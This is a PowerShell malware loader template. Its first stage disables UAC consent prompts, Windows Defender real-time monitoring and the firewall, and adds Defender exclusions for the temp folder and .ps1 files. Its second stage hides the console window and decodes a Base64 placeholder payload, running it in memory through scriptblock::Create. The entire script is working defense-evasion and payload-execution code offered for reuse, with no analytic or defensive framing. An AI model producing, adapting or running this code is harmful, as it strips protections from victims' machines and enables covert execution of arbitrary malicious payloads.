# --- STAGE 1: CONDITIONAL DEFENSE EVASION ---
try {
    # 1. Disable UAC Prompts (Registry based, works on all versions)
    if (Test-Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System") {
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
    }

    # 2. Check if Windows Defender Module is available before running commands
    if (Get-Module -ListAvailable -Name WindowsDefender) {
        Write-Output "Defender detected. Applying exclusions..."
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionExtension ".ps1" -ErrorAction SilentlyContinue
    } else {
        Write-Output "Defender not present. Skipping MpPreference."
    }
    
    # 3. Disable Firewall (Service based, works on all versions)
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
} 
catch {
    Write-Warning "Privilege check failed: Non-Admin context."
}

# --- STAGE 2: PAYLOAD EXECUTION ---

# Window Hider Logic
$ms = @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
# Using a unique name for each run to avoid assembly collision errors
$typeName = "W32_$(Get-Random)"
$type = Add-Type -MemberDefinition $ms -Name $typeName -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

$GlobalPayload = "dAByAH..." # Your Base64 String

try {
    if ($GlobalPayload -ne "") {
        $decodedBytes = [System.Convert]::FromBase64String($GlobalPayload)
        $decodedScript = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
        
        # Using [scriptblock]::Create ensures the code runs in the current session's memory
        $scriptBlock = [scriptblock]::Create($decodedScript)
        & $scriptBlock
    }
}
catch {
    $_.Exception.Message | Out-File "$env:TEMP\payload_debug.txt" -Append
}